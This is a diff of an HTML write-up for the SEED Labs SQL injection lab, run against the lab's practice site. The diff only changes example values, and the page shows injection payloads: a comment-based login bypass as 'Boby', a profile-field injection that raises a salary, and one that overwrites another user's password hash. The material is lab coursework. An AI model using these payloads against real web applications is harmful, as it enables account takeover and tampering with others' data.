@@ -63,7 +63,7 @@ curl 'http://www.seedlabsqlinjection.com/unsafe_home.php?username=Admin%27%20%23
 <p>In order to edit the profile, please log in and then jump to the link address: <br><a href="http://www.seedlabsqlinjection.com/unsafe_edit_frontend.php" rel="nofollow">http://www.seedlabsqlinjection.com/unsafe_edit_frontend.php</a> by Hand.</p>
 <h2>Task 3.1</h2>
 <p>Log in with Alice's username and password, enter <br> <a href="http://www.seedlabsqlinjection.com/unsafe_edit_frontend.php" rel="nofollow">http://www.seedlabsqlinjection.com/unsafe_edit_frontend.php</a></p>
-<p>Modify Phone Number as <code>', Salary=30000</code> and save</p>
+<p>Modify Phone Number as <code>', Salary=500000</code> and save</p>
 <h2>Task 3.2</h2>
 <p>Log in with username <code>Boby' #</code>  and arbitrary password, open his profile edit page.</p>
 <p>Fill in with:</p>
@@ -97,13 +97,13 @@ curl 'http://www.seedlabsqlinjection.com/unsafe_home.php?username=Admin%27%20%23
 <span class="pl-en">header</span>(<span class="pl-s">"Location: unsafe_home.php"</span>);
 <span class="pl-en">exit</span>();</pre>
 <p>We should do all things in <strong>Phone Number</strong> field.</p>
-<p>Assume we want to change Boby's password as <code>soudayo</code>. First, we should get SHA1 value of our new password via some <a href="http://www.sha1-online.com/" rel="nofollow">online tool</a> as</p>
-<pre><code>c0b656d5e415ca1a8e098a408f913ec229e120b6
+<p>Assume we want to change Boby's password as <code>tedwashere</code>. First, we should get SHA1 value of our new password via some <a href="http://www.sha1-online.com/" rel="nofollow">online tool</a> as</p>
+<pre><code>1b3263246794fe4094be7ae99e21b34454d9676f
 </code></pre>
 <p>Then construct <strong>Phone Number</strong> as:</p>
-<pre><code>', password='c0b656d5e415ca1a8e098a408f913ec229e120b6' where name='Boby' #
+<pre><code>', password='1b3263246794fe4094be7ae99e21b34454d9676f' where name='Boby' #
 </code></pre>
-<p>and save. Now, the change works. You can log in with username <code>Boby</code> and password <code>soudayo</code>.</p>
+<p>and save. Now, the change works. You can log in with username <code>Boby</code> and password <code>tedwashere</code>.</p>
 <p>Verify:</p>
 <p>Screen shoot is in SQL Injection Folder</p>
 
